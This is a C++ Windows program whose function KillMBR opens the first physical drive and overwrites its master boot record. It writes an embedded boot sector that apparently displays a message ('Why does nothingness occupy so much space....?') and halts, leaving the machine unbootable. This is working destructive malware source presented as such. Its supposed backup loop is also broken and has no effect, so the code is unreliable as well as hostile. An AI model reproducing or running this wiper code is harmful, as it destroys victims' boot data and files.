#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <tchar.h>
#include <winternl.h>

#define BUFFER_SIZE 512

using namespace std;

unsigned char mbrData[BUFFER_SIZE] = {
    0xFC, 0xE8, 0x1C, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x34, 0x7C, 0x50, 0xFC, 0x8A, 0x04, 0x3C,
    0x00, 0x74, 0x0B, 0xE8, 0x03, 0x00, 0x46, 0xEB, 0xF4, 0xB4, 0x0E, 0xCD, 0x10, 0xC3, 0xEB, 0xFE,
    0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x04, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18, 0xCD, 0x10, 0xC3, 0x5D,
    0xCD, 0x10, 0xEB, 0xFE, 0x57, 0x68, 0x79, 0x20, 0x64, 0x6F, 0x65, 0x73, 0x20, 0x6E, 0x6F, 0x74,
    0x68, 0x69, 0x6E, 0x67, 0x6E, 0x65, 0x73, 0x73, 0x20, 0x6F, 0x63, 0x63, 0x75, 0x70, 0x79, 0x20,
    0x73, 0x6F, 0x20, 0x6D, 0x75, 0x63, 0x68, 0x20, 0x73, 0x70, 0x61, 0x63, 0x65, 0x2E, 0x2E, 0x2E,
    0x2E, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA};

int KillMBR()
{
    DWORD write;
    BOOL statusIsOk;
    BYTE *bufferPointer;
    LPVOID mbrRef = VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);
    LPVOID mbrBufferRef = VirtualAlloc(NULL, BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);
    HANDLE drive = CreateFile(_T("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

    if (drive == INVALID_HANDLE_VALUE)
        printf("[STATUS] Error!\n");

    statusIsOk = ReadFile(drive, mbrRef, BUFFER_SIZE, &write, NULL);

    if (!statusIsOk)
        printf("[STATUS] Error!\n");

    BYTE *pointer = (BYTE *)mbrRef;

    if (*pointer == 0x90)
    {
        CloseHandle(drive);
        goto exit;
    }

    CloseHandle(drive);

    bufferPointer = (BYTE *)mbrBufferRef;

    for (int index = 0; index < BUFFER_SIZE; index++)
        *bufferPointer - *pointer ^ 0x90;

    drive = CreateFile(_T("\\\\.\\PhysicalDrive0"), GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

    if (drive == INVALID_HANDLE_VALUE)
        printf("[STATUS] Error!\n");

    statusIsOk = WriteFile(drive, mbrBufferRef, BUFFER_SIZE, &write, NULL);

    if (!statusIsOk)
        printf("[STATUS] Error!\n");

    memcpy(mbrRef, mbrData, 0x1bd);

    SetFilePointer(drive, 0, NULL, FILE_BEGIN);

    WriteFile(drive, mbrRef, BUFFER_SIZE, &write, NULL);

    CloseHandle(drive);

exit:
    VirtualFree(mbrRef, BUFFER_SIZE, MEM_RELEASE);
    VirtualFree(mbrBufferRef, BUFFER_SIZE, MEM_RELEASE);

    return EXIT_SUCCESS;
}